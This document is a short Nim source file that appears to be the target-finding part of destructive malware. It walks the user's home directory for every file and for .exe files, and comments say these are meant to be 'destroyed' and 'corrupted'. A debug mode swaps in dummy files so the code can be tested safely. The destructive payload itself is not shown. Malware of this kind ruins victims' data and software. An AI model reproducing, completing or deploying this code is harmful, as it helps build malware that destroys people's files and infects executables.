import std/[os, strutils]

proc searchWithExt*(exts: seq[string], paths: seq[string] = @[getHomeDir()]): seq[string] =
  for path in paths:
    for file in walkDirRec(dir = path, skipSpecial = true):
      # Ugly way to check a file's extension.
      let list = split(file, ".")
      for ext in exts:
        if list[high(list)].toLower() == ext: result.add(file)
  return result

proc searchWithExt*(ext: string, paths: seq[string] = @[getHomeDir()]): seq[string] = return searchWithExt(@[ext], paths)

when not defined debug:
  when defined(windows):
    const rootDir* = "C:\\"
  else:
    const rootDir* = "/"
else:
  const rootDir* = getCurrentDir() & "/hideout/"

when defined(debug):
  # Make a dummy file specifically to be destroyed.
  proc findFiles*(): seq[string] =
    try:
      writeFile("dummy_file.txt", "Hello World!")
      return @["dummy_file.txt"]
    except:
      # Return nothing as a safe measure.
      return @[]
else:
  # Search *everywhere* in the user's home directory.
  proc findFiles*(): seq[string] =
    for path in walkDirRec(dir = getHomeDir(), skipSpecial = true):
      result.add(path)
    return result

when defined(debug):
  # Make a dummy exe specifically to be replaced
  proc findExes*(): seq[string] =
    try:
      writeFile("dummy.exe","")
      return @["dummy.exe"]
    except:
      # Return nothing as a safe measure.
      return @[]
else:
  # Search everywhere in the user's home directory for exe files to corrupt.
  proc findExes*(paths: seq[string] = @[getHomeDir()]): seq[string] =
    return searchWithExt("exe", paths)